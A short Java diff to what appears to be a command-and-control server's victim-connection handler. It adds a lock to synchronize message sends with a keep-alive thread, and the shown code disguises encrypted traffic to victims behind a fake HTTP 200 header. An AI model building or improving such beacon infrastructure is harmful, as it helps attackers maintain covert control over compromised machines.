@@ -13,6 +13,7 @@ public class BeaconClientHandler implements Runnable{
     private Boolean sentinel = true;
     private keepAlive keepAliveClass;
     private Thread keepAliveThread;
+    private Object sendLock;
 
     /**
      * Use this Class to create a new thread to handle each victim connection
@@ -25,7 +26,8 @@ public class BeaconClientHandler implements Runnable{
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
         this.os = os;
-        this.keepAliveClass = new keepAlive(this.duplexer, true, true);
+        this.sendLock = new Object();
+        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
         this.keepAliveThread = new Thread(keepAliveClass);
     }
 
@@ -68,7 +70,9 @@ public class BeaconClientHandler implements Runnable{
             message = encrypt(message);
             String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
             message = httpHeader + message;
-            duplexer.send(message);
+            synchronized(sendLock){
+                duplexer.send(message);
+            }
         }
     }
 
